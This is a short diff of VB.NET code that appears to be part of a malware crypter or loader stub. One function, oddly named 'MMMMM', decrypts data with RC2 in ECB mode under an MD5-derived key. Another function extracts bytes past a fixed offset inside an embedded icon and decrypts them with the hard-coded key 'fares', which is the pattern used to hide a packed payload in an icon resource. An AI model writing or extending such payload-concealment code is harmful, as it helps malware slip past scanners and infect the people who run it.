@@ -1,0 +1,16 @@
+		Private Shared Function MMMMM(B As Byte(), ikey As String) As Byte()
+			Dim RC2 As RC2CryptoServiceProvider = New RC2CryptoServiceProvider()
+			Dim hashkey As MD5CryptoServiceProvider = New MD5CryptoServiceProvider()
+			Dim key As Byte() = hashkey.ComputeHash(Encoding.BigEndianUnicode.GetBytes(ikey))
+			RC2.Key = key
+			RC2.Mode = CipherMode.ECB
+			Return RC2.CreateDecryptor().TransformFinalBlock(B, 0, B.Length)
+		End Function
+
+		Public Shared Function icon(I As Icon) As Byte()
+			Dim Ms As MemoryStream = New MemoryStream()
+			I.Save(Ms)
+			Dim z As Byte() = New Byte(Ms.Length - 84598L - 1) {}
+			Buffer.BlockCopy(Ms.ToArray(), 84598, z, 0, z.Length)
+			Return Form1.MMMMM(z, "fares")
+		End Function
